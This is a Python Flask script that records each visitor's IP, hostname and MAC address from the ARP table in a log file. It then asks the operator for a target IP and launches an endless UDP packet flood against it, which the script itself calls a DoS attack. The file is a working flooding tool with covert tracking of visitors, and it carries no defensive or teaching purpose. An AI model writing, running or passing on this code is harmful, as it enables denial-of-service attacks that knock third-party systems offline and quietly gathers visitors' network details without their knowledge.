from flask import Flask, request
import socket
import random
import threading
import time
import subprocess
import re

app = Flask(__name__)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1024)

def send_udp_packets(ip, port):
    sent = 0
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
        except Exception as e:
            time.sleep(0.01)
            print("Active...")

def get_arp_info(ip):
    try:
        arp_output = subprocess.check_output(['arp', '-a'], text=True)
        print("Full ARP Table Output:")
        print(arp_output) 

        pattern = rf"^(\S+)\s+\({ip}\)\s+at\s+([0-9a-fA-F:]+)\s+(.*)$"
        
        for line in arp_output.splitlines():
            line = line.strip()
            if ip in line:
                match = re.match(pattern, line)
                if match:
                    hostname = match.group(1)
                    mac_address = match.group(2)
                    extra_info = match.group(3)
                    iface_match = re.search(r"\bon\s+(\S+)", extra_info)
                    interface = iface_match.group(1) if iface_match else "Unknown"

                    print(f"Match found for IP {ip}: Hostname={hostname}, MAC={mac_address}, Interface={interface}")
                    return {
                        'ip': ip,
                        'hostname': hostname,
                        'mac': mac_address,
                        'interface': interface
                    }
    except Exception as e:
        print(f"Error retrieving ARP info: {e}")
    return None

@app.route('/')
def index():
    client_ip = request.remote_addr

    print(f"Incoming connection from {client_ip}")

    arp_info = get_arp_info(client_ip)
    if arp_info:
        print(f"ARP Info for {client_ip}: IP={arp_info['ip']}, Hostname={arp_info['hostname']}, MAC={arp_info['mac']}, Interface={arp_info['interface']}")
        with open('connections.log', 'a') as f:
            f.write(f"Client IP: {arp_info['ip']}, Hostname: {arp_info['hostname']}, MAC: {arp_info['mac']}, Interface: {arp_info['interface']}\n")
    else:
        print(f"No ARP info found for {client_ip}")

    target_ip = input(f"DoS? (Target IP or press Enter to skip): ").strip()
    if target_ip:
        port = 5000  
        print(f"Starting DoS attack on {target_ip} at port {port}...")
        thread = threading.Thread(target=send_udp_packets, args=(target_ip, port))
        thread.daemon = True
        thread.start()
    else:
        print("DoS skipped.")

    return f"Hello from Flask! Your IP is {client_ip}."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5007)
